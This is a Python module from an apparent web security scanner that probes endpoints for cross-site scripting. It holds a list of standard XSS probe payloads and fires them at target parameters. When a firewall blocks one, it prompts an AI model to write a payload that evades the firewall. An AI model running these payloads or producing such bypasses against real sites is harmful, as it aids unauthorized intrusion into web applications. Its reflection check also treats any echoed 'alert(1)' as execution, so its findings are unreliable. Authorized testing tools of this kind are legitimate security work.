"""XSS vulnerability analyzer - Evolutionary Bypass."""

import logging
from typing import Any

import httpx

logger = logging.getLogger(__name__)


class EvolutionaryXSS:
    """Test XSS payloads with AI-powered WAF bypass generation."""

    INITIAL_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        '"><iframe src="javascript:alert(1)">',
    ]

    def __init__(self, ai_router=None):
        self.ai_router = ai_router

    async def test_and_bypass(
        self,
        endpoint: str,
        param: str,
        base_url: str = "",
        method: str = "GET",
    ) -> list[dict[str, Any]]:
        """Test XSS payloads and generate bypasses if blocked."""
        findings = []

        for payload in self.INITIAL_PAYLOADS:
            result = await self._test_payload(
                endpoint, param, payload, base_url, method
            )

            if result.get("blocked") and self.ai_router:
                # Generate bypass using AI
                bypass_payload = await self._generate_bypass(result, payload)
                if bypass_payload:
                    bypass_result = await self._test_payload(
                        endpoint, param, bypass_payload, base_url, method
                    )
                    if bypass_result.get("executed"):
                        findings.append(
                            {
                                "vulnerable": True,
                                "type": "xss_bypass",
                                "severity": "HIGH",
                                "endpoint": endpoint,
                                "parameter": param,
                                "original_payload": payload,
                                "bypass_payload": bypass_payload,
                                "waf_bypassed": True,
                            }
                        )
            elif result.get("executed"):
                findings.append(
                    {
                        "vulnerable": True,
                        "type": "xss",
                        "severity": "HIGH",
                        "endpoint": endpoint,
                        "parameter": param,
                        "payload": payload,
                    }
                )

        return findings

    async def _test_payload(
        self, endpoint: str, param: str, payload: str, base_url: str, method: str
    ) -> dict[str, Any]:
        """Test a single XSS payload."""
        try:
            from urllib.parse import quote

            encoded_payload = quote(payload, safe="")

            async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
                if method == "GET":
                    url = f"{base_url}{endpoint}?{param}={encoded_payload}"
                    response = await client.get(url)
                else:
                    url = f"{base_url}{endpoint}"
                    response = await client.post(url, data={param: payload})

                response_text = response.text

                # Check if payload executed (reflected in response)
                if payload in response_text or "alert(1)" in response_text.lower():
                    # Check if WAF blocked it
                    if any(
                        block_indicator in response_text.lower()
                        for block_indicator in [
                            "blocked",
                            "forbidden",
                            "firewall",
                            "security",
                            "not acceptable",
                        ]
                    ):
                        return {
                            "blocked": True,
                            "payload": payload,
                            "response": response_text[:200],
                        }
                    else:
                        return {"executed": True, "payload": payload}

                return {"blocked": False, "executed": False}
        except Exception:
            return {"blocked": False, "executed": False}

    async def _generate_bypass(
        self, blocked_result: dict, original_payload: str
    ) -> str:
        """Use AI to generate WAF bypass payload."""
        if not self.ai_router:
            return original_payload

        prompt = f"""The following XSS payload was blocked by a WAF:
Original: {original_payload}
WAF Response: {blocked_result.get('response', '')[:300]}

Generate an alternative XSS payload that might bypass this WAF.
Consider: encoding variations, event handlers, alternative tags, unicode encoding.
Return ONLY the payload, no explanations."""

        try:
            result = await self.ai_router.call_model(
                "xss_bypass", prompt, max_tokens=256
            )
            bypass = result.get("output", "").strip()
            return bypass if bypass else original_payload
        except Exception:
            return original_payload


async def analyze_xss(
    endpoints: list[dict[str, Any]],
    params: dict[str, set[str]],
    model_router: Any,
    ai_router=None,
    base_url: str = "",
) -> dict[str, Any]:
    """Analyze for XSS vulnerabilities with evolutionary bypass."""
    xss_candidates = []
    confirmed_findings = []

    reflection_params = [
        "q",
        "search",
        "query",
        "keyword",
        "message",
        "content",
        "text",
        "comment",
        "name",
        "title",
        "description",
        "email",
        "phone",
    ]

    xss_tester = EvolutionaryXSS(ai_router)

    for endpoint in endpoints:
        path = endpoint.get("path", "")
        endpoint_params = endpoint.get("parameters", [])

        for param in endpoint_params:
            if any(ref_param in param.lower() for ref_param in reflection_params):
                xss_candidates.append(
                    {
                        "endpoint": path,
                        "parameter": param,
                        "method": endpoint.get("method", "GET"),
                    }
                )

                # Test with evolutionary bypass if AI router available
                if ai_router and base_url:
                    findings = await xss_tester.test_and_bypass(
                        path, param, base_url, endpoint.get("method", "GET")
                    )
                    confirmed_findings.extend(findings)

    return {
        "vulnerability": "XSS",
        "candidates": xss_candidates,
        "confirmed_findings": confirmed_findings,
        "total_to_test": len(xss_candidates),
        "bypasses_attempted": len(confirmed_findings),
        "recommendation": f"Test {len(xss_candidates)} parameters for XSS. {len(confirmed_findings)} confirmed with bypass.",
    }
